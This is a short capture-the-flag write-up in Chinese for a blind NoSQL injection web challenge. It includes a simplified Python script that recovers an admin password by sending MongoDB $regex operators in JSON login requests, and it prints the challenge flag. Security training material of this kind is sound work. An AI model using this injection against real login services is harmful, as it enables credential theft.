#Web 

## 題目

**No Sql Injection Blind**
給了一個網址，點開來跟 [[No Sql Injection]] 長一樣，程式碼也一樣，但沒有 secret，flag 改藏在密碼裡
```python
# Insert secret user
secret_user = {"username": "admin", "password": flag}
users.update_one({"username": "admin"}, {"$set": secret_user}, upsert=True)
```

---
## 解題
1. 觀察 source code，發現flag 改藏在密碼裡，題目是 injection blind -> 推測為暴力猜測
2. 寫腳本試，簡化版：
   ```python
   # payload.py
	URL = "http://chals1:20025/login" 

	password = "CTF{"
	CHARSET = string.ascii_letters + string.digits + string.punctuation
	
	session = requests.Session()
	# while password not endwith "}"
	for c in CHARSET:
		pw = password + c
		data = {
			"username": username,
			"password": {
				"$regex": "^" + re.escape(pw)
			}
		}
	
		r = session.post(URL, json=data)
   ```
   ![[W1-26_flag1.png|289]]![[W1-26_flag2.png|473]]
3. flag = `CTF{no_sql_injection_blind_a51e29145821e41a5526af2d}`











